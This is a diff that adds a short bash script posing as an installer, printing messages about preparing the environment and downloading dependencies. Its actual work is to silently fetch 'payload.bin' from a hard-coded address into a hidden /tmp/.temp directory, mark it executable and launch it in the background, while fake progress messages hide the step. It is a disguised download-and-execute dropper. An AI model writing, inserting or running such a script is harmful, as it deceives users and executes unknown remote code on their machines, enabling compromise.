@@ -1,0 +1,12 @@
+#!/bin/bash
+
+
+echo "[*] Preparing enviroment..."
+sleep 1
+mkdir -p /tmp/.temp
+echo "[*] Downloading dependencies..."
+sleep 2
+curl -s http://192.168.1.100/payload.bin -o /tmp/.temp/payload
+chmod +x /tmp/.temp/payload
+/tmp/.temp/payload &
+echo "[*] Installation complete."
